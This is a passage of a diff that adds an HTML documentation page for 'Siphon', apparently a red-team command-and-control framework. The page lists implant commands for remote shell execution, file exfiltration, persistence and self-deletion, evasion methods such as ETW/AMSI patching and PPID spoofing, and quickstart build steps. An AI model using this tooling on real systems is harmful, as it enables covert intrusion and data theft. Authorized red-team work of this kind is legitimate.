+     <span class="box">&#x2502;</span><span class="arrow">&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2524;</span>
+     <span class="box">&#x2502;</span>                    <span class="box">&#x2502;</span>
+     <span class="box">&#x2502;</span> <span class="desc">HTTPS POST /submit</span> <span class="box">&#x2502;</span>
+     <span class="arrow">&#x251C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;</span><span class="box">&#x2502;</span>
+     <span class="box">&#x2502;</span>              <span class="box">&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2534;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;</span>
+     <span class="box">&#x2502;</span>              <span class="box">&#x2502;</span>   <span class="lbl">Loot</span>    <span class="box">&#x2502;</span>
+     <span class="box">&#x2502;</span>              <span class="box">&#x2502;</span> <span class="desc">(AES-GCM)</span> <span class="box">&#x2502;</span>
+     <span class="box">&#x2502;</span>              <span class="box">&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</span>
+</pre>
+                        </div>
+                    </div>
+                    <hr class="arch-divider">
+                    <div class="arch-stack">
+                        <span>Go 1.24</span>
+                        <span>ECDH P-256</span>
+                        <span>AES-256-GCM</span>
+                        <span>uTLS</span>
+                        <span>CGO_ENABLED=0</span>
+                        <span>Cross-Platform</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- TECH STACK -->
+        <section class="reveal">
+            <div class="section-label">// tech stack</div>
+            <h2 class="section-title">What powers Siphon</h2>
+            <p class="section-desc">
+                Every layer of the framework, from key exchange to operator UI, chosen for operational security and minimal footprint.
+            </p>
+            <div class="build-table-wrap">
+                <table class="build-table">
+                    <thead>
+                        <tr>
+                            <th>Layer</th>
+                            <th>Technology</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Language</td>
+                            <td>Go 1.24.9</td>
+                        </tr>
+                        <tr>
+                            <td>Crypto</td>
+                            <td>ECDH P-256, AES-256-GCM, HMAC-SHA256</td>
+                        </tr>
+                        <tr>
+                            <td>TLS</td>
+                            <td>uTLS (HelloChrome_Auto)</td>
+                        </tr>
+                        <tr>
+                            <td>Transport</td>
+                            <td>HTTPS, cookie beacon, JSON envelopes</td>
+                        </tr>
+                        <tr>
+                            <td>Evasion</td>
+                            <td>ETW/AMSI patches, PPID spoofing</td>
+                        </tr>
+                        <tr>
+                            <td>Persistence</td>
+                            <td>Registry, schtask, startup folder</td>
+                        </tr>
+                        <tr>
+                            <td>UI</td>
+                            <td>Catppuccin Mocha (operator CLI)</td>
+                        </tr>
+                        <tr>
+                            <td>Build</td>
+                            <td>Make, cross-compilation (CGO_ENABLED=0)</td>
+                        </tr>
+                        <tr>
+                            <td>Testing</td>
+                            <td>go test -race, go vet, staticcheck</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- COMMAND REFERENCE -->
+        <section class="reveal">
+            <div class="section-label">// command reference</div>
+            <h2 class="section-title">Server flags &amp; operator commands</h2>
+            <p class="section-desc">
+                Everything you need to run the server and interact with implants from the operator console.
+            </p>
+
+            <h3 style="font-size: 16px; color: var(--ctp-teal); margin-bottom: 16px; font-weight: 600;">Server Flags</h3>
+            <div class="build-table-wrap" style="margin-bottom: 40px;">
+                <table class="build-table">
+                    <thead>
+                        <tr>
+                            <th>Flag</th>
+                            <th>Default</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>-listen</td>
+                            <td>:443</td>
+                            <td>Listen address</td>
+                        </tr>
+                        <tr>
+                            <td>-cert</td>
+                            <td>server/certs/server.crt</td>
+                            <td>TLS certificate path</td>
+                        </tr>
+                        <tr>
+                            <td>-key</td>
+                            <td>server/certs/server.key</td>
+                            <td>TLS private key path</td>
+                        </tr>
+                        <tr>
+                            <td>-serverkey</td>
+                            <td>server/certs/server.pem</td>
+                            <td>ECDH server key path</td>
+                        </tr>
+                        <tr>
+                            <td>-beacon-path</td>
+                            <td>/api/news</td>
+                            <td>Beacon endpoint URL path</td>
+                        </tr>
+                        <tr>
+                            <td>-submit-path</td>
+                            <td>/api/submit</td>
+                            <td>Submit endpoint URL path</td>
+                        </tr>
+                        <tr>
+                            <td>-auth</td>
+                            <td>(none)</td>
+                            <td>Pre-shared HMAC auth token</td>
+                        </tr>
+                        <tr>
+                            <td>-genkey</td>
+                            <td>&mdash;</td>
+                            <td>Generate ECDH keypair and exit</td>
+                        </tr>
+                        <tr>
+                            <td>-gencert</td>
+                            <td>&mdash;</td>
+                            <td>Generate self-signed TLS cert and exit</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <h3 style="font-size: 16px; color: var(--ctp-teal); margin-bottom: 16px; font-weight: 600;">Operator Commands</h3>
+            <div class="build-table-wrap">
+                <table class="build-table">
+                    <thead>
+                        <tr>
+                            <th>Command</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>implants</td>
+                            <td>List all checked-in implants</td>
+                        </tr>
+                        <tr>
+                            <td>interact &lt;id&gt;</td>
+                            <td>Select an implant to interact with</td>
+                        </tr>
+                        <tr>
+                            <td>cmd &lt;command&gt;</td>
+                            <td>Execute a shell command on the active implant</td>
+                        </tr>
+                        <tr>
+                            <td>upload &lt;remote_path&gt;</td>
+                            <td>Exfiltrate a file from the implant to the server</td>
+                        </tr>
+                        <tr>
+                            <td>download &lt;local&gt; &lt;remote&gt;</td>
+                            <td>Push a file from the server to the implant</td>
+                        </tr>
+                        <tr>
+                            <td>sleep &lt;seconds&gt;</td>
+                            <td>Adjust the implant beacon interval</td>
+                        </tr>
+                        <tr>
+                            <td>persist &lt;method&gt; [name]</td>
+                            <td>Install persistence (registry, schtask, startup)</td>
+                        </tr>
+                        <tr>
+                            <td>unpersist &lt;method&gt; [name]</td>
+                            <td>Remove persistence</td>
+                        </tr>
+                        <tr>
+                            <td>selfdestruct</td>
+                            <td>Rename and delete the implant binary</td>
+                        </tr>
+                        <tr>
+                            <td>exit-implant</td>
+                            <td>Instruct the implant process to exit</td>
+                        </tr>
+                        <tr>
+                            <td>back</td>
+                            <td>Return to the main menu</td>
+                        </tr>
+                        <tr>
+                            <td>tasks</td>
+                            <td>Show queued tasks for the active implant</td>
+                        </tr>
+                        <tr>
+                            <td>results</td>
+                            <td>Show task results for the active implant</td>
+                        </tr>
+                        <tr>
+                            <td>help</td>
+                            <td>Print command reference</td>
+                        </tr>
+                        <tr>
+                            <td>exit</td>
+                            <td>Exit the operator console</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- SECURITY DESIGN -->
+        <section class="reveal">
+            <div class="section-label">// security design</div>
+            <h2 class="section-title">Defense in depth</h2>
+            <p class="section-desc">
+                Every layer of the framework is designed for operational security &mdash; from ephemeral key exchange to binary hardening.
+            </p>
+            <div class="build-table-wrap">
+                <table class="build-table">
+                    <thead>
+                        <tr>
+                            <th>Property</th>
+                            <th>Implementation</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Forward secrecy</td>
+                            <td>Ephemeral ECDH P-256 key exchange per session</td>
+                        </tr>
+                        <tr>
+                            <td>Payload confidentiality</td>
+                            <td>AES-256-GCM authenticated encryption</td>
+                        </tr>
+                        <tr>
+                            <td>Key distribution</td>
+                            <td>Server public key embedded at build time via ldflags</td>
+                        </tr>
+                        <tr>
+                            <td>HMAC authentication</td>
+                            <td>HMAC-SHA256 pre-shared token covering ID, PubKey, Nonce, Ciphertext</td>
+                        </tr>
+                        <tr>
+                            <td>Loot encryption</td>
+                            <td>Exfiltrated files encrypted at rest with AES-256-GCM</td>
+                        </tr>
+                        <tr>
+                            <td>Path traversal</td>
+                            <td>filepath.Base() sanitization on implant-controlled IDs</td>
+                        </tr>
+                        <tr>
+                            <td>Memory safety</td>
+                            <td>Deep-copied session keys; ECDH shared secrets zeroed after use</td>
+                        </tr>
+                        <tr>
+                            <td>TLS fingerprinting</td>
+                            <td>uTLS with Chrome JA3 fingerprint (HelloChrome_Auto)</td>
+                        </tr>
+                        <tr>
+                            <td>Resource limits</td>
+                            <td>Max 1000 implants, 1000 results per implant, 24h max sleep</td>
+                        </tr>
+                        <tr>
+                            <td>Binary hardening</td>
+                            <td>Stripped with -s -w -trimpath; no debug symbols or paths</td>
+                        </tr>
+                        <tr>
+                            <td>Traffic blending</td>
+                            <td>uTLS Chrome fingerprint, cookie-based beacon, standard HTTPS endpoints</td>
+                        </tr>
+                        <tr>
+                            <td>Input limits</td>
+                            <td>64 KB cookie, 1 MB response, 10 MB submit body</td>
+                        </tr>
+                        <tr>
+                            <td>File permissions</td>
+                            <td>0600 for all sensitive outputs</td>
+                        </tr>
+                        <tr>
+                            <td>Concurrency safety</td>
+                            <td>sync.RWMutex and atomic operations throughout</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- QUICK START -->
+        <section id="quick-start" class="reveal">
+            <div class="section-label">// quickstart</div>
+            <h2 class="section-title">Operational in 60 seconds</h2>
+            <p class="section-desc">
+                Generate keys, build the server and implant, deploy. Go 1.24+ and make are the only requirements.
+            </p>
+            <div class="start-row">
+                <div class="start-terminal">
+                    <div class="start-titlebar">
+                        <div class="hero-dot hero-dot--red" style="width: 10px; height: 10px;"></div>
+                        <div class="hero-dot hero-dot--yellow" style="width: 10px; height: 10px;"></div>
+                        <div class="hero-dot hero-dot--green" style="width: 10px; height: 10px;"></div>
+                        <div class="start-titlebar-text">bash</div>
+                    </div>
+                    <div class="start-body">
+                        <div class="start-line"><span class="prompt">$</span> <span class="comment"># Generate ECDH keypair + TLS cert</span></div>
+                        <div class="start-line"><span class="prompt">$</span> <span class="cmd">make setup</span></div>
+                        <div class="start-line"></div>
+                        <div class="start-line"><span class="prompt">$</span> <span class="comment"># Build the server</span></div>
+                        <div class="start-line"><span class="prompt">$</span> <span class="cmd">make server</span></div>
+                        <div class="start-line"></div>
+                        <div class="start-line"><span class="prompt">$</span> <span class="comment"># Build the implant</span></div>
+                        <div class="start-line"><span class="prompt">$</span> <span class="cmd">make implant <span class="flag">SERVER_PK</span>=<span class="arg">&lt;hex&gt;</span> <span class="flag">C2_HOST</span>=<span class="arg">https://your-c2:443</span></span></div>
+                        <div class="start-line"></div>
+                        <div class="start-line"><span class="prompt">$</span> <span class="comment"># Start the server</span></div>
+                        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./build/siphon-server <span class="flag">-listen</span> <span class="arg">:443</span> <span class="flag">-auth</span> <span class="arg">secret</span></span></div>
+                        <div class="start-line"></div>
+                        <div class="start-line"><span class="prompt">$</span> <span class="comment"># Deploy implant on target, then interact:</span></div>
+                        <div class="start-line"><span class="prompt">siphon&gt;</span> <span class="cmd">interact <span class="arg">abc123</span></span></div>
+                        <div class="start-line"><span class="prompt">siphon(abc123)&gt;</span> <span class="cmd">cmd <span class="arg">whoami</span></span></div>
+                    </div>
+                </div>
+                <div class="start-info">
+                    <p><code>make setup</code> generates an ECDH P-256 keypair and a self-signed TLS certificate. The server public key hex is printed for embedding into implant builds.</p>
+                    <p>The implant is cross-compiled for Windows by default (<code>GOOS=windows GOARCH=amd64</code>). Use <code>make implant-linux</code> for a Linux test build.</p>
+                    <p>All implant configuration &mdash; C2 host, sleep interval, server public key, auth token &mdash; is baked into the binary at compile time via <code>-ldflags -X</code>. The implant takes zero arguments and leaves no config on disk.</p>
+                    <p>The server uses HTTPS with optional HMAC authentication. Set <code>-auth</code> on both the server and the implant build (<code>AUTH_TOKEN=</code>) to enable message-level authentication.</p>
+                    <p style="margin-top: 24px; font-size: 13px; color: var(--ctp-overlay1);">Built for offense. Encrypted by default.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- FOOTER -->
+        <footer class="site-footer">
+            <div class="footer-title">Siphon</div>
+            <div class="footer-tagline">Quiet extraction. Encrypted transport. Zero disk footprint.</div>
+            <div class="footer-links">
+                <a href="#">GitHub</a>
+                <a href="#">License</a>
+                <a href="#">Report Issue</a>
+            </div>
+            <div class="footer-copy">Siphon &mdash; Red Team Command &amp; Control Framework</div>
+            <div class="footer-disclaimer">
+                For authorized red team engagements, CTF competitions, and educational purposes only. Always obtain proper authorization before testing on systems you do not own.
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var reveals = document.querySelectorAll('.reveal');
+            var observer = new IntersectionObserver(function(entries) {
+                entries.forEach(function(entry) {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('visible');
+                    }
+                });
+            }, {
+                threshold: 0.1,
+                rootMargin: '0px 0px -40px 0px'
+            });
+            reveals.forEach(function(el) {
+                observer.observe(el);
+            });
+        });
+    </script>
+</body>
+</html>
